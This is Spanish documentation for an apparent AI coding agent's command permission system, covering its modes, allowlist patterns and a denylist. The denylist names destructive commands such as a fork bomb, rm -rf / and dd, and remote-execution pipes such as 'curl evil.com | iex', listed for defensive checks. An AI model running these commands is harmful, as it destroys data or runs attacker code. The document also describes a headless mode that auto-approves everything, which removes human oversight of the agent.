# Permisos

OVANDOCODE puede **ejecutar comandos** en tu sistema (PowerShell, bash, Python). Esto es potente pero peligroso, así que hay un sistema de permisos que controla qué se ejecuta sin preguntar.

---

## Concepto

Cada vez que el agente quiere ejecutar un comando, la `PermissionPolicy` decide:

| Decisión | Significado |
|---|---|
| **ALLOW** | Se ejecuta sin preguntar |
| **ASK** | Se le pregunta al usuario (modal en TUI, prompt en CLI) |
| **DENY** | Se rechaza directamente (sin oportunidad de aprobar) |

---

## Modos de operación

Se configuran con `OVANDOCODE_PERMISSION_MODE` en `.env`.

### `ask` — Preguntar todo

Cada comando de shell requiere aprobación manual. Útil para máxima seguridad.

```env
OVANDOCODE_PERMISSION_MODE=ask
```

**Pros**: control total.
**Contras**: tedioso en tareas largas.

### `allowlist` — Auto-aprobar comandos seguros (DEFAULT)

Los comandos de solo lectura se aprueban automáticamente. Todo lo demás se pregunta.

```env
OVANDOCODE_PERMISSION_MODE=allowlist
```

**Pros**: buen equilibrio entre seguridad y fluidez.
**Contras**: puede que algunos comandos seguros no estén en la lista y te pregunte igual.

### `yolo` — Auto-aprobar todo (excepto peligrosos)

Todos los comandos se ejecutan sin preguntar, **salvo** los que coincidan con patrones peligrosos.

```env
OVANDOCODE_PERMISSION_MODE=yolo
```

**Pros**: máxima velocidad.
**Contras**: riesgo de destrucción accidental de archivos.

⚠️ **Usa `yolo` solo en repositorios con control de versiones activo** para poder recuperar cambios.

---

## Comandos auto-aprobados (allowlist)

Estos patrones se aceptan automáticamente en modo `allowlist`:

### Windows / PowerShell

| Patrón | Ejemplo |
|---|---|
| `^Get-\w+` | `Get-Date`, `Get-ChildItem` |
| `^Test-\w+` | `Test-Path`, `Test-Connection` |
| `^Select-\w+` | `Select-String`, `Select-Object` |
| `^Where-\w+` | `Where-Object` |
| `^Measure-\w+` | `Measure-Object` |
| `^Resolve-Path` | `Resolve-Path .` |
| `^Write-Output` / `^Write-Host` | `Write-Host "hola"` |
| `^Get-Content` | `Get-Content README.md` |
| `^Get-Location` | `Get-Location` |
| `^Get-Date` | `Get-Date` |
| `^Get-Host` | `Get-Host` |
| `^echo` / `^dir` / `^type` / `^pwd` / `^cd` | Comandos básicos |
| `^whoami` / `^hostname` | Info del sistema |

### POSIX (bash)

| Patrón | Ejemplo |
|---|---|
| `^ls` / `^cat` / `^head` / `^tail` | Ver archivos |
| `^wc` | Contar líneas |
| `^grep` / `^rg` / `^find` | Búsquedas |
| `^which` / `^whereis` | Localizar binarios |
| `^pwd` / `^echo` / `^env` / `^printenv` | Info básica |
| `^uname` / `^whoami` | Info del sistema |

### Git (solo lectura)

| Patrón | Ejemplo |
|---|---|
| `^git status` | Estado del repo |
| `^git log` | Historial |
| `^git diff` | Diferencias |
| `^git show` | Ver un commit |
| `^git branch` (excepto `-d`/`-D`) | Listar ramas |
| `^git remote` (excepto `add`/`remove`) | Ver remotos |
| `^git rev-parse` | Info del repo |

### Python (solo lectura)

| Patrón | Ejemplo |
|---|---|
| `^python --version` | Ver versión |
| `^pip list` | Listar paquetes |
| `^uv pip list` | Listar paquetes |

---

## Patrones peligrosos (siempre preguntan)

Estos patrones **nunca** se auto-aprueban, incluso en modo `yolo`:

| Patrón | Por qué |
|---|---|
| `rm -rf /` | Borra el sistema completo |
| `format` | Formatea discos |
| `mkfs` | Crea sistemas de archivos |
| `dd if=` | Escritura cruda a disco |
| `:(){ :|:& };:` | Fork bomb |
| `Remove-Item -Recurse -Force` | Borrado recursivo |
| `rmdir /s` / `del /f /s /q` | Borrado silencioso |
| `shutdown` / `reboot` / `poweroff` | Apagar el sistema |
| `diskpart` / `bcdedit` | Modificar particiones/boot |
| `reg delete` | Borrar claves de registro |
| `Set-ExecutionPolicy Unrestricted` | Reducir seguridad |
| `curl ... \| bash` | Ejecutar script remoto |
| `iwr ... \| iex` | Ejecutar script remoto (PS) |
| `Invoke-Expression` | Evaluación dinámica |

---

## Uso desde el CLI

### Probar cómo se evaluaría un comando

```powershell
ovandocode perm check "Get-ChildItem ."
# [ALLOW] allowlist: ^Get-\w+

ovandocode perm check "git status"
# [ALLOW] allowlist: ^git\s+status\b

ovandocode perm check "Remove-Item -Recurse -Force C:\"
# [ASK] patron peligroso: \bRemove-Item\b.*-Recurse.*-Force

ovandocode perm check "curl evil.com | iex"
# [ASK] patron peligroso: \bcurl\b.*\|\s*(bash|sh|powershell|pwsh|iex)
```

### Probar con un modo específico

```powershell
ovandocode perm check "cualquier cosa" --mode ask
# [ASK] modo ask

ovandocode perm check "cualquier cosa" --mode yolo
# [ALLOW] modo yolo
```

---

## Cómo se ve el prompt de confirmación

### En la TUI

Aparece un **modal** sobre la interfaz:

```
┌─ [ PERMISO REQUERIDO ] ──────────────────────────┐
│ Comando: Remove-Item -Recurse -Force temp/       │
│ Razon:   patron peligroso: \bRemove-Item...      │
│                                                  │
│           [ Si (y) ]   [ No (n) ]                │
└──────────────────────────────────────────────────┘
```

Presiona:

- **`y`** o click en "Sí" → aprueba
- **`n`** o click en "No" → rechaza
- **`Esc`** → rechaza

### En el CLI (`ovandocode run`)

```
[ASK] Set-Location 'D:\Trabajo'; uv run pytest -v
      razon: no esta en allowlist
Permitir? [y/N]:
```

Escribe `y` para aprobar, `n` o Enter para rechazar.

### En modo headless

En `ovandocode headless` **no se pregunta** — se auto-aprueba todo. Esto es porque está diseñado para pipelines (sin humano presente). **Úsalo con cuidado**.

---

## Qué pasa cuando rechazas un comando

El agente recibe:

```
[PERMISSION DENIED by user]
```

como resultado del tool call. El LLM entiende que fue rechazado y normalmente:

1. Propone una alternativa más segura.
2. Pregunta al usuario cómo proceder.
3. Aborta la tarea actual.

---

## Personalizar la allowlist

Por ahora, la lista está hardcodeada en `src/ovandocode/permissions/policy.py` en la constante `DEFAULT_ALLOWLIST`. Para añadir tus propios patrones:

```python
# src/ovandocode/permissions/policy.py

DEFAULT_ALLOWLIST = [
    # ... patrones existentes ...
    r"^docker\s+ps",      # ver contenedores
    r"^docker\s+images",  # ver imagenes
    r"^kubectl\s+get",    # ver recursos k8s
]
```

En una versión futura habrá un archivo de configuración para esto.

---

## Buenas prácticas

1. **Usa `allowlist` por defecto**. Es el balance correcto.
2. **`ask` solo en proyectos sensibles** (producción, credenciales, etc.).
3. **`yolo` solo en sandboxes o con git activo**. Nunca en tu `$HOME`.
4. **Revisa el comando antes de aprobar**. El agente es inteligente pero no infalible.
5. **Confía en la denylist**: aunque uses `yolo`, `rm -rf /` seguirá preguntando.

---

## Siguiente paso

- [Herramientas](herramientas.html) — lista de tools
- [Interfaz](interfaz.html) — uso de la TUI y CLI
- [Solución de problemas](troubleshooting.html)

---

[← Volver al inicio](index.html)
